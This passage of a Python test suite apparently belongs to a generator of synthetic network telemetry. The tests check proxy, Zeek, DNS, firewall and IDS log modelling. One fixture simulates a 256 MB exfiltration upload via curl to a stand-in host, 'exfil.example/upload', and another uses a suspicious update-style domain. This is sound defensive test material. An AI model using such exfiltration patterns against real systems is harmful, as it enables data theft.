        kubectl_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=shell_pid,
            image="/usr/bin/kubectl",
            command_line="kubectl logs worker-3b4c2 --tail=100",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip=proxy.ip,
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=8080,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=kubectl_pid,
            source_system=linux_system,
            hostname=generator._proxy_fqdn(proxy),
            conn_state="SF",
            process_image="/usr/bin/kubectl",
            http=HttpContext(
                method="CONNECT",
                host="example.com",
                uri="example.com:443",
                version="1.1",
                user_agent=(
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
                status_code=200,
                status_msg="Connection Established",
            ),
            proxy_bypass=True,
            preserve_http_outcome=True,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == proxy.ip
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != kubectl_pid
        assert client_event.process.image == "/usr/bin/google-chrome"

    def test_one_shot_proxy_client_process_starts_near_request_time(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        proxy = generator._ip_to_system["10.0.3.10"]
        generator._explicit_proxy_client_process_hint = Mock(
            return_value=(
                r"C:\Windows\System32\curl.exe",
                'curl.exe --proxy http://PROXY-01.example.org:8080 "https://www.bing.com/"',
            )
        )
        request_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        pid, image = generator._ensure_explicit_proxy_client_process(
            source_system=workstation,
            time=request_time,
            proxy_context=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="www.bing.com:443",
                host="www.bing.com",
                status_code=200,
                user_agent="curl/8.4.0",
                proxy_fqdn="PROXY-01.example.org",
            ),
            proxy_sys=proxy,
            dst_port=443,
        )

        proc = generator.state_manager.get_process(workstation.hostname, pid)
        assert image == r"C:\Windows\System32\curl.exe"
        assert proc is not None
        lead_seconds = (request_time - proc.start_time).total_seconds()
        assert 0 < lead_seconds <= 8.0

    def test_server_like_proxy_client_hint_suppresses_workstation_web_tools(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy = generator._ip_to_system["10.0.3.10"]
        server = System(
            hostname="FILE-SRV-01",
            ip="10.0.2.20",
            os="Windows Server 2022",
            type="server",
            roles=["file_server"],
        )
        dc = System(
            hostname="DC-01",
            ip="10.0.2.10",
            os="Windows Server 2022",
            type="domain_controller",
            roles=["domain_controller", "dns_server"],
        )

        for source_system in (server, dc):
            for user_agent in (
                "curl/8.4.0",
                "Wget/1.21.4",
                "python-requests/2.31.0",
                "Mozilla/5.0 Chrome/123.0.0.0",
            ):
                hint = generator._explicit_proxy_client_process_hint(
                    user_agent=user_agent,
                    hostname="downloads.cloud.com",
                    dst_port=443,
                    proxy_sys=proxy,
                    source_system=source_system,
                )

                assert hint is None

    def test_server_like_proxy_client_hint_keeps_service_style_owners(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy = generator._ip_to_system["10.0.3.10"]
        server = System(
            hostname="APP-01",
            ip="10.0.2.30",
            os="Windows Server 2022",
            type="server",
            roles=["app_server"],
        )

        hint = generator._explicit_proxy_client_process_hint(
            user_agent="Go-http-client/1.1",
            hostname="status.example.com",
            dst_port=443,
            proxy_sys=proxy,
            source_system=server,
        )

        assert hint is not None
        image, command_line = hint
        assert image.endswith("service-healthcheck.exe")
        assert "status.example.com" in command_line

    def test_one_shot_proxy_client_process_terminates_after_request(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        generator._explicit_proxy_client_process_hint = Mock(
            return_value=(
                r"C:\Windows\System32\curl.exe",
                'curl.exe --proxy http://PROXY-01.example.org:8080 "https://www.bing.com/"',
            )
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="www.bing.com:443",
                host="www.bing.com",
                status_code=200,
                user_agent="curl/8.4.0",
                proxy_fqdn="PROXY-01.example.org",
                cache_result="MISS",
            )
        )

        generator.generate_connection(
            src_ip=workstation.ip,
            dst_ip="204.79.197.200",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=workstation,
            hostname="www.bing.com",
            conn_state="SF",
        )

        active_images = [
            proc.image
            for proc in generator.state_manager.get_processes_on_system(workstation.hostname)
        ]
        assert r"C:\Windows\System32\curl.exe" not in active_images

    def test_documentation_ip_with_external_hostname_routes_through_proxy(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="203.0.113.45",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=3000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="dynsync-update.net",
            http=HttpContext(
                method="GET",
                host="dynsync-update.net",
                uri="/jquery-3.3.1.min.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                status_code=200,
                status_msg="OK",
            ),
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        origin_ip = resolve_domain_ip("dynsync-update.net", src_host="PROXY-01")
        assert ("10.0.3.10", origin_ip, 80) in pairs
        assert ("10.0.1.10", "203.0.113.45", 80) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.host == "dynsync-update.net"
        assert proxy_event.proxy.method == "GET"

    def test_raw_ip_with_suppressed_hostname_preserves_proxy_egress_ioc(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        raw_ip = "45.33.32.30"
        hashed_ip = resolve_domain_ip(raw_ip, src_host="PROXY-01")

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip=raw_ip,
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", raw_ip, 443) in pairs
        assert ("10.0.3.10", hashed_ip, 443) not in pairs

        dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
        raw_ip_dns_events = [event for event in dns_events if event.dns.query == raw_ip]
        assert raw_ip_dns_events
        assert any(event.dns.answers == [raw_ip] for event in raw_ip_dns_events)
        assert all(hashed_ip not in event.dns.answers for event in raw_ip_dns_events)

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.host == raw_ip

    def test_auto_generated_proxy_get_has_no_zeek_request_body(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "GET"
        assert http_event.http.request_body_len == 0
        assert http_event.network.orig_bytes > 0

    def test_https_service_alias_uses_explicit_proxy(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="https",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.method == "CONNECT"
        assert proxy_event.proxy.host == "example.com"

    def test_plaintext_public_domain_redirects_instead_of_success(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="52.85.84.55",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="aws.amazon.com",
            conn_state="SF",
        )

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.host == "aws.amazon.com"
        assert proxy_event.proxy.status_code in {301, 302}

        http_events = [
            call.args[0]
            for call in emitters["zeek_http"].emit.call_args_list
            if call.args[0].http.host == "aws.amazon.com"
        ]
        assert http_events
        assert {event.http.status_code for event in http_events}.issubset({301, 302})
        assert all(event.http.response_body_len < 1000 for event in http_events)

    def test_egress_sensor_sees_proxy_to_origin_only(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert any(pair[0] == "10.0.3.10" and pair[2] == 53 for pair in pairs)
        assert ("10.0.3.10", origin_ip, 443) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs
        assert emitters["zeek_dns"].emit.called
        assert emitters["zeek_ssl"].emit.called

    def test_sensor_monitoring_both_sides_sees_both_proxy_legs(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", origin_ip, 443) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs

    def test_https_miss_propagates_http_size_to_origin_tls_leg(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://example.com/jquery.js",
                host="example.com",
                status_code=200,
                sc_bytes=107_200,
                cs_bytes=620,
                time_taken=400,
                user_agent="Mozilla/5.0",
                content_type="application/javascript",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/jquery.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=107_000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/javascript"],
            ),
        )

        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        egress_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_events
        assert egress_events[0].network.resp_bytes >= 107_000
        client_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        ]
        assert client_events
        assert egress_events[0].timestamp > client_events[0].timestamp
        client_close = client_events[0].timestamp + timedelta(
            seconds=client_events[0].network.duration
        )
        assert egress_events[0].timestamp < client_close
        egress_http_events = [
            call.args[0]
            for call in emitters["zeek_http"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_http_events
        assert egress_http_events[0].http.host == "example.com"
        assert egress_http_events[0].http.uri == "/jquery.js"
        assert egress_http_events[0].http.user_agent == "Mozilla/5.0"

    def test_inspected_https_upload_client_leg_does_not_double_count_request_body(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        request_bytes = 268_435_456
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="POST",
                url="https://exfil.example/upload",
                host="exfil.example",
                status_code=200,
                sc_bytes=900,
                cs_bytes=request_bytes + 313,
                time_taken=1200,
                user_agent="curl/8.1.2",
                content_type="application/octet-stream",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=12.0,
            orig_bytes=request_bytes,
            resp_bytes=512,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="exfil.example",
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="exfil.example",
                uri="/upload",
                version="1.1",
                user_agent="curl/8.1.2",
                request_body_len=request_bytes,
                response_body_len=512,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/octet-stream"],
            ),
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert client_event.network.orig_bytes > proxy_event.proxy.cs_bytes
        assert client_event.network.orig_bytes < request_bytes * 2

    def test_allowed_proxy_miss_origin_leg_is_established_when_state_is_implicit(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=107_200,
                cs_bytes=620,
                time_taken=400,
                user_agent="Mozilla/5.0",
                content_type="application/javascript",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/jquery.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=107_000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["application/javascript"],
            ),
        )

        origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        egress_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == origin_ip
            and call.args[0].network.dst_port == 443
        ]
        assert egress_events
        assert egress_events[0].network.conn_state == "SF"
        assert egress_events[0].ssl is not None
        assert egress_events[0].ssl.established is True

    def test_https_subresources_reuse_active_connect_tunnel(self):
        from evidenceforge.generation.activity.dns_registry import resolve_domain_ip

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        first_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
            ),
        )
        pairs_after_first = list(_conn_pairs(emitters))
        proxy_calls_after_first = emitters["proxy_access"].emit.call_count
        ssl_calls_after_first = emitters["zeek_ssl"].emit.call_count
        reused_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time + timedelta(seconds=12),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=0.2,
            orig_bytes=200,
            resp_bytes=1200,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/app.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=1200,
                status_code=200,
                status_msg="OK",
            ),
        )

        assert reused_uid == first_uid
        assert _conn_pairs(emitters) == pairs_after_first
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs_after_first
        resolved_origin_ip = resolve_domain_ip("example.com", src_host="PROXY-01")
        assert ("10.0.3.10", resolved_origin_ip, 443) in pairs_after_first
        assert emitters["proxy_access"].emit.call_count == proxy_calls_after_first + 1
        reused_proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert reused_proxy_event.network.application_layer_only is True
        assert reused_proxy_event.network.zeek_uid == first_uid
        assert reused_proxy_event.proxy.url == "https://example.com/app.js"
        assert emitters["zeek_ssl"].emit.call_count == ssl_calls_after_first

    def test_tight_successful_https_requests_each_emit_proxy_request_on_reused_tunnel(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        first_uid = ""
        pairs_after_first: list[tuple[str, str, int]] = []

        for idx in range(12):
            uid = generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="93.184.216.34",
                time=start_time + timedelta(seconds=idx * 3),
                dst_port=443,
                proto="tcp",
                service="ssl",
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                emit_dns=True,
                conn_state="SF",
                http=HttpContext(
                    method="GET",
                    host="example.com",
                    uri=f"/api/export/qlattice?page={idx + 1}",
                    version="1.1",
                    user_agent="Mozilla/5.0",
                    response_body_len=5000,
                    status_code=200,
                    status_msg="OK",
                ),
            )
            if idx == 0:
                first_uid = uid
                pairs_after_first = list(_conn_pairs(emitters))
            else:
                assert uid == first_uid
                assert _conn_pairs(emitters) == pairs_after_first

        assert emitters["proxy_access"].emit.call_count == 12
        app_layer_proxy_events = [
            call.args[0]
            for call in emitters["proxy_access"].emit.call_args_list
            if call.args[0].network.application_layer_only
        ]
        assert len(app_layer_proxy_events) == 11
        assert {event.proxy.url for event in app_layer_proxy_events} == {
            f"https://example.com/api/export/qlattice?page={idx}" for idx in range(2, 13)
        }

    def test_https_request_after_tunnel_timeout_emits_new_transport(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        first_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/first",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
            ),
        )
        pairs_after_first = list(_conn_pairs(emitters))

        second_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time + timedelta(seconds=300),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/second",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
            ),
        )

        assert second_uid != first_uid
        assert len(_conn_pairs(emitters)) > len(pairs_after_first)
        assert emitters["proxy_access"].emit.call_count == 2
        assert not emitters["proxy_access"].emit.call_args.args[0].network.application_layer_only

    def test_non_success_https_status_does_not_use_reused_tunnel_shortcut(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        start_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        first_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="example.com",
                uri="/login",
                version="1.1",
                user_agent="Mozilla/5.0",
                request_body_len=300,
                response_body_len=900,
                status_code=401,
                status_msg="Unauthorized",
            ),
        )
        second_uid = generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=start_time + timedelta(seconds=3),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="example.com",
                uri="/login",
                version="1.1",
                user_agent="Mozilla/5.0",
                request_body_len=300,
                response_body_len=900,
                status_code=401,
                status_msg="Unauthorized",
            ),
        )

        assert second_uid != first_uid
        assert emitters["proxy_access"].emit.call_count == 2
        assert all(
            not call.args[0].network.application_layer_only
            for call in emitters["proxy_access"].emit.call_args_list
        )

    def test_denied_request_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="ids",
                    name="egress-ids",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["snort_alert"],
                ),
                NetworkSensor(
                    type="firewall",
                    name="egress-fw",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["cisco_asa"],
                ),
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="http://example.com/private",
                host="example.com",
                status_code=403,
                sc_bytes=1200,
                cs_bytes=420,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/private",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
            ids=IdsContext(
                sid=2013028,
                message="ET POLICY Suspicious HTTP Activity",
                classification="policy-violation",
                priority=2,
            ),
            firewall=FirewallContext(
                action="permit",
                msg_id=302013,
                connection_id=12345,
                src_interface="dmz",
                dst_interface="outside",
            ),
        )

        pairs = _conn_pairs(emitters)
        assert pairs
        assert all(pair == ("10.0.1.10", "10.0.3.10", 8080) for pair in pairs)
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 403
        assert proxy_event.proxy.cache_result == "DENIED"
        assert emitters["zeek_http"].emit.called
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.status_code == 403
        assert http_event.http.status_msg == "Forbidden"
        assert http_event.http.response_body_len == 1200
        assert http_event.http.resp_mime_types == ["text/html"]
        assert all(
            call.args[0].network.dst_ip == "10.0.3.10"
            for call in emitters["zeek_http"].emit.call_args_list
        )
        assert not emitters["zeek_ssl"].emit.called
        assert not emitters["snort_alert"].emit.called
        assert not emitters["cisco_asa"].emit.called

    def test_inspected_https_denial_keeps_connect_successful(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://example.com/private",
                host="example.com",
                status_code=403,
                tunnel_status_code=200,
                sc_bytes=1200,
                cs_bytes=420,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/private",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
        )

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 403
        assert proxy_event.proxy.tunnel_status_code == 200
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "CONNECT"
        assert http_event.http.status_code == 200
        assert http_event.http.status_msg == "Connection Established"
        assert ("10.0.3.10", "93.184.216.34", 443) not in _conn_pairs(emitters)

